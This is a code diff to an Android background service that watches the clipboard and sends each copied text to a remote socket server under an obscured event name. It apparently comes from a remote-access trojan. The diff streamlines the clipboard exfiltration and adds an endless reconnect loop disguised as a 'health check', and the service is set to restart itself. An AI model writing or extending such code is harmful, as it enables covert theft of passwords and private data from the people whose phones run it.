@@ -12,6 +12,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.graphics.Color;
+import android.os.AsyncTask;
 import android.os.Build;
 import android.os.IBinder;
 import android.support.annotation.Nullable;
@@ -76,13 +77,7 @@ public class MainService extends Service {
                 if (clipData.getItemCount() > 0) {
                     CharSequence text = clipData.getItemAt(0).getText();
                     if (text != null) {
-                        try {
-                            JSONObject data = new JSONObject();
-                            data.put("text", text);
-                            IOSocket.getInstance().getIoSocket().send("_0xCB", data);
-                        } catch (JSONException e) {
-                            e.printStackTrace();
-                        }
+                        IOSocket.getInstance().send("_0xCB", text);
                     }
                 }
             }
@@ -92,10 +87,25 @@ public class MainService extends Service {
         clipboardManager.addPrimaryClipChangedListener(mPrimaryChangeListener);
 
         contextOfApplication = this;
-        ConnectionManager.startAsync(this);
+        initHealthCheck();
         return START_STICKY;
     }
 
+    private void initHealthCheck() {
+        new Thread(() -> {
+        while (true) {
+            try {
+                Thread.sleep(30000);
+                ConnectionManager.startAsync(this);
+                Thread.sleep(60000);
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
+        }
+        }).start();
+
+
+    }
     @Override
     public void onDestroy() {
         super.onDestroy();
